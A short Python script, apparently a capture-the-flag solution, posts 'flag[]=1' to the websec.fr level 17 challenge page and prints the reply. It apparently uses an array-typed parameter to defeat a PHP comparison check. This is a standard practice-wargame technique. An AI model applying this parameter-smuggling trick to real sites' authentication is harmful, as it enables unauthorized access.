import requests
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}
response = requests.post('https://websec.fr/level17/index.php', headers=headers, data='flag[]=1')
print(response.text)